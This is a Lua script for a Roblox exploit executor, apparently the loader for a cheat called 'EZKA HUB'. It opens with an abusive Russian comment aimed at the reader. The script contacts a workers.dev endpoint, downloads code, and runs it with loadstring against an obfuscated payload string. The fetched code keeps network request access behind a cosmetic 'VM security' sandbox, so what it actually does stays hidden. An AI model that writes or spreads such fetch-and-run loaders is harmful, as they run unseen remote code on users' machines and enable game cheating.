-- ЕСЛИ ТЫ ЭТО ЧИТАЕШЬ ТО ТВОЯ МАТЬ СДОХЛА

_G.CAN_EZKA = true

local EZKA_ALR = game.CoreGui:FindFirstChild("EZKA_ALR")
if EZKA_ALR then return end

local EZKA_ALR = Instance.new("BoolValue")
EZKA_ALR.Name = "EZKA_ALR"
EZKA_ALR.Parent = game.CoreGui

local t_gui = Instance.new("ScreenGui")
t_gui.Name = "EZKA"
t_gui.IgnoreGuiInset = true
t_gui.ResetOnSpawn = false
t_gui.Parent = game.CoreGui

local tttttt = Instance.new("TextLabel")
tttttt.Parent = t_gui
tttttt.Size = UDim2.new(0.7, 0, 0.2, 0)
tttttt.Position = UDim2.new(0.5, 0, 0.5, 0)
tttttt.AnchorPoint = Vector2.new(0.5, 0.5)
tttttt.TextScaled = true
tttttt.BackgroundTransparency = 1
tttttt.Text = "EZKA HUB LOADING..."
tttttt.TextColor3 = Color3.fromRGB(255, 255, 255)
tttttt.Font = Enum.Font.SourceSansBold

local payload = "q8Cd3Fw0.r3Cv7Gh1.x9Kj2Lw1.z5Xv1Gh6.i2Qw8Xz5.o7Er3Cd0.u4As6Vw3.j9Mk3Er8.e6Xz2Df8.v3Cx9As4.6Xz2Df8k.v3Cx9As4.x9Kj2Lw1.w1Rt9Sp4.h8Bn4Jm9.8Yt2Sp0A.V7Sd3Lp1.o7Er3Cd0.o7Er3Cd0.t5Bn4Jk9.C5Pa9Jk2.h8Bn4Jm9.o7Er3Cd0.6Xz2Df8k.5Bn4Jm9m.b7Nz2Qw5.o7Er3Cd0.o7Er3Cd0.t5Bn4Jk9.i2Qw8Xz5.8Yt2Sp0A.2Hj1Kw8G.2Hj1Kw8G.t5Bn4Jk9.x9Kj2Lw1.i2Qw8Xz5.o7Er3Cd0.h8Bn4Jm9.k1Lp6Ko2.f9Sd1Lp2.4Qw1Xz3y.x9Kj2Lw1.t5Bn4Jk9.t5Bn4Jk9.2Hj1Kw8G.e6Xz2Df8.3Xv1Gh6a.8Cd3Fw0i.t5Bn4Jk9.N2Hj1Kw8.o7Er3Cd0.E1Bn5Jm4.3Cx9As4d.2Hj1Kw8G.u4As6Vw3.x9Kj2Lw1.s3Io7Gh1.5Bn4Jm9m.3Cv7Gh1l.3Cv7Gh1l.6Xz2Df8k.3Cv7Gh1l"
local layers = 1

local reqFn = request or http_request or (syn and syn.request) or httprequest

local protectedEnv = setmetatable({
    game = game,
    workspace = workspace,
    script = script,
    setclipboard = function(...) error("[VM SECURITY] Clipboard access denied.") end,
    toclipboard = function(...) error("[VM SECURITY] Clipboard access denied.") end,
    writefile = function(...) error("[VM SECURITY] File writing denied.") end,
    appendfile = function(...) error("[VM SECURITY] File writing denied.") end,
    request = reqFn,
    http_request = reqFn,
    httprequest = reqFn
}, {
    __index = function(t, k)
        return getfenv(0)[k]
    end
})

local function initVM()
    local authFetchSuccess, authResponse = pcall(function()
        return reqFn({
            Url = "https://vm-decoder-service.katanasoft15.workers.dev/fetch-auth-script",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode({ 
                timestamp = DateTime.now().UnixTimestampMillis 
            })
        })
    end)

    if authFetchSuccess and authResponse then
        local authBodyData = authResponse.Body or authResponse.body
        if authBodyData then
            local decodeSuccess, decodedData = pcall(function()
                return game:GetService("HttpService"):JSONDecode(authBodyData)
            end)

            if decodeSuccess and decodedData and decodedData.success and decodedData.code and decodedData.sessionId then
                local authFn, authErr = loadstring(decodedData.code)
                if authFn then
                    setfenv(authFn, protectedEnv)
                    local passStatus, passErr = pcall(authFn, payload, layers, tostring(decodedData.sessionId))
                    if not passStatus then
                        warn("[VM AUTH] Execution failed: " .. tostring(passErr))
                    end
                else
                    warn("[VM AUTH] Failed to load auth script: " .. tostring(authErr))
                end
            else
                local errMsg = (decodedData and decodedData.error) or "Missing Session ID."
                warn("[VM AUTH] Handshake rejected: " .. tostring(errMsg))
            end
        end
    else
        warn("[VM AUTH] Network request for auth script failed.")
    end
end

if task and task.defer then
    task.defer(initVM)
else
    coroutine.wrap(initVM)()
end
